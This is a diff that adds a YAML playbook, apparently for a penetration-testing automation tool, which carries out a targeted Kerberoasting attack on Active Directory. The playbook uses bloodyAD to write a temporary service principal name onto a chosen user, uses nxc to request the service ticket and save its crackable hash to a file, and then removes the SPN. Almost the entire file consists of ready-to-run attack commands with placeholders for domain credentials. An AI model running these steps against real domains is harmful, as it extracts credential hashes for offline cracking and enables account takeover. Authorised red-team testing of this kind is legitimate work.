@@ -1,0 +1,18 @@
+name: ad_targeted_kerberoast
+description: bloodyAD writes a temporary SPN onto a user you control, nxc kerberoasts it, then bloodyAD removes the SPN (cleanup)
+steps:
+  - title: Validate actor creds over LDAP
+    command: nxc ldap {{DC_IP:ip}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}}
+    continue_on_error: false
+  - title: "Write a temporary SPN onto {{TARGET_USER}} (arm with: q set CONFIRM_SPN 1)"
+    command: bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} add spn {{TARGET_USER}} {{SPN:str:cifs/roast}}
+    when: "CONFIRM_SPN"
+    continue_on_error: false
+  - title: Kerberoast the now-roastable account and write the TGS hash to a file
+    command: nxc ldap {{DC_IP:ip}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} --kerberoasting kerberoast.txt
+    when: "CONFIRM_SPN"
+    continue_on_error: true
+  - title: Cleanup — remove the SPN we added
+    command: bloodyAD --host {{DC_HOST}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} remove servicePrincipalName {{TARGET_USER}} {{SPN:str:cifs/roast}}
+    when: "CONFIRM_SPN"
+    continue_on_error: true
